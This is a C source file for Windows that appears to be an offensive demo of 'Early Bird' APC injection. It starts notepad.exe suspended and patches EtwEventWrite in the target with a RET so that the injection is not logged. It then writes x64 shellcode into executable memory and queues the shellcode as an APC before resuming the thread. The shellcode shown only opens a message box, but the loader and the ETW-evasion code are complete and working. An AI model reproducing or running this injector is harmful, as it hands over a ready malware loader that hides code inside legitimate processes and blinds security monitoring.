#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>

// x64 MessageBox shellcode (same as above)
unsigned char shellcode[] =
    "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41\x51"
    "\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x3e\x48"
    "\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72\x50\x3e\x48"
    "\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02"
    "\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x3e"
    "\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48\x01\xd0\x3e\x8b\x80\x88"
    "\x00\x00\x00\x48\x85\xc0\x74\x6f\x48\x01\xd0\x50\x3e\x8b\x48"
    "\x18\x3e\x44\x8b\x40\x20\x49\x01\xd0\xe3\x5c\x48\xff\xc9\x3e"
    "\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41"
    "\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24"
    "\x08\x45\x39\xd1\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0"
    "\x66\x3e\x41\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e"
    "\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41"
    "\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
    "\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7\xc1"
    "\x00\x00\x00\x00\x3e\x48\x8d\x95\xfe\x00\x00\x00\x3e\x4c\x8d"
    "\x85\x11\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83\x56\x07\xff"
    "\xd5\x48\x31\xc9\x41\xba\xf0\xb5\xa2\x56\xff\xd5\x48\x65\x6c"
    "\x6c\x6f\x20\x66\x72\x6f\x6d\x20\x45\x61\x72\x6c\x79\x20\x42"
    "\x69\x72\x64\x20\x41\x50\x43\x21\x00\x48\x65\x6c\x6c\x6f\x20"
    "\x57\x6f\x72\x6c\x64\x21\x00";

// Native API function pointer
typedef NTSTATUS(NTAPI *pNtQueueApcThreadEx)(
    HANDLE ThreadHandle,
    HANDLE ApcReserveHandle,
    PIO_APC_ROUTINE ApcRoutine,
    PVOID ApcRoutineContext,
    PIO_STATUS_BLOCK ApcStatusBlock,
    ULONG ApcReserved);

// ETW patching function
VOID PatchEtwInTargetProcess(HANDLE hProcess, HMODULE hNtdllInTarget)
{
    FARPROC pEtwEventWrite = NULL;
    LPVOID remoteEtwAddress = NULL;
    BYTE patch = 0xC3; // RET

    // Calculate EtwEventWrite address in target process
    // Get local address and offset
    HMODULE hLocalNtdll = GetModuleHandleA("ntdll.dll");
    FARPROC pLocalEtw = GetProcAddress(hLocalNtdll, "EtwEventWrite");

    if (!pLocalEtw)
        return;

    // Calculate offset from ntdll base
    ULONG64 offset = (ULONG64)pLocalEtw - (ULONG64)hLocalNtdll;

    // Apply same offset in target process
    remoteEtwAddress = (LPVOID)((ULONG64)hNtdllInTarget + offset);

    printf("[*] Patching ETW in target at: %p\n", remoteEtwAddress);

    // Change memory protection
    DWORD oldProtect;
    VirtualProtectEx(hProcess, remoteEtwAddress, 1, PAGE_EXECUTE_READWRITE, &oldProtect);

    // Write RET patch
    WriteProcessMemory(hProcess, remoteEtwAddress, &patch, 1, NULL);

    // Restore protection
    VirtualProtectEx(hProcess, remoteEtwAddress, 1, oldProtect, &oldProtect);

    printf("[+] ETW patched in target process\n");
}

// Get ntdll base address in target process
HMODULE GetNtdllBaseInTarget(HANDLE hProcess)
{
    HMODULE hMods[1024];
    DWORD cbNeeded;

    if (EnumProcessModulesEx(hProcess, hMods, sizeof(hMods), &cbNeeded, LIST_MODULES_ALL))
    {
        for (int i = 0; i < (cbNeeded / sizeof(HMODULE)); i++)
        {
            char szModName[MAX_PATH];
            if (GetModuleFileNameExA(hProcess, hMods[i], szModName, sizeof(szModName)))
            {
                if (strstr(szModName, "ntdll.dll"))
                {
                    return hMods[i];
                }
            }
        }
    }

    return NULL;
}

int main()
{
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    LPVOID remoteShellcode = NULL;
    HMODULE hNtdllRemote = NULL;

    printf("[ APC Early-Bird Advanced ]\n");
    printf("[*] PID: %d\n", GetCurrentProcessId());

    // 1. Create process in SUSPENDED state
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.cb = sizeof(STARTUPINFO);

    if (!CreateProcessA(
            "C:\\Windows\\System32\\notepad.exe",
            NULL, NULL, NULL, FALSE,
            CREATE_SUSPENDED,
            NULL, NULL, &si, &pi))
    {
        printf("[-] CreateProcess failed: %d\n", GetLastError());
        return -1;
    }

    printf("[+] Process created. PID: %d (SUSPENDED)\n", pi.dwProcessId);

    // 2. Get ntdll base in target (for ETW patching)
    hNtdllRemote = GetNtdllBaseInTarget(pi.hProcess);
    if (hNtdllRemote)
    {
        printf("[+] ntdll.dll in target at: %p\n", hNtdllRemote);

        // 3. Patch ETW in target BEFORE shellcode executes
        // This prevents logging of our injection
        PatchEtwInTargetProcess(pi.hProcess, hNtdllRemote);
    }

    // 4. Allocate memory in target
    remoteShellcode = VirtualAllocEx(
        pi.hProcess,
        NULL,
        sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);

    if (!remoteShellcode)
    {
        printf("[-] VirtualAllocEx failed\n");
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return -1;
    }

    printf("[+] Shellcode memory allocated at: %p\n", remoteShellcode);

    // 5. Write shellcode
    if (!WriteProcessMemory(
            pi.hProcess,
            remoteShellcode,
            shellcode,
            sizeof(shellcode),
            NULL))
    {
        printf("[-] WriteProcessMemory failed\n");
        VirtualFreeEx(pi.hProcess, remoteShellcode, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return -1;
    }

    printf("[+] Shellcode written (%zu bytes)\n", sizeof(shellcode));

    // 6. Try Native API for stealth (if available)
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    pNtQueueApcThreadEx NtQueueApcThreadEx =
        (pNtQueueApcThreadEx)GetProcAddress(hNtdll, "NtQueueApcThreadEx");

    if (NtQueueApcThreadEx)
    {
        printf("[*] Using NtQueueApcThreadEx (Native API)...\n");

        NTSTATUS status = NtQueueApcThreadEx(
            pi.hThread,
            NULL,
            (PIO_APC_ROUTINE)remoteShellcode,
            NULL,
            NULL,
            0);

        if (status == 0)
            printf("[+] APC queued via Native API\n");
        else
            printf("[-] NtQueueApcThreadEx failed: 0x%08lx\n", status);
    }
    else
    {
        // Fallback to standard API
        printf("[*] Using QueueUserAPC...\n");

        if (!QueueUserAPC((PAPCFUNC)remoteShellcode, pi.hThread, 0))
        {
            printf("[-] QueueUserAPC failed\n");
            VirtualFreeEx(pi.hProcess, remoteShellcode, 0, MEM_RELEASE);
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            return -1;
        }

        printf("[+] APC queued via QueueUserAPC\n");
    }

    // 7. RESUME THREAD - APC EXECUTES IMMEDIATELY!
    printf("\n[!] CRITICAL: Resuming thread - APC executes NOW!\n");
    printf("[!] Shellcode runs BEFORE notepad.exe entry point!\n");

    ResumeThread(pi.hThread);

    printf("[+] Thread resumed. Shellcode executing in target...\n");
    printf("[+] Check for MessageBox from notepad.exe\n");

    // 8. Wait and cleanup
    WaitForSingleObject(pi.hProcess, INFINITE);

    VirtualFreeEx(pi.hProcess, remoteShellcode, 0, MEM_RELEASE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    printf("\n[*] Process terminated. Demo complete.\n");
    system("pause");

    return 0;
}

// x86_64-w64-mingw32-gcc -o apc_early_bird_advanced.exe apc_early_bird_advanced.c -lpsapi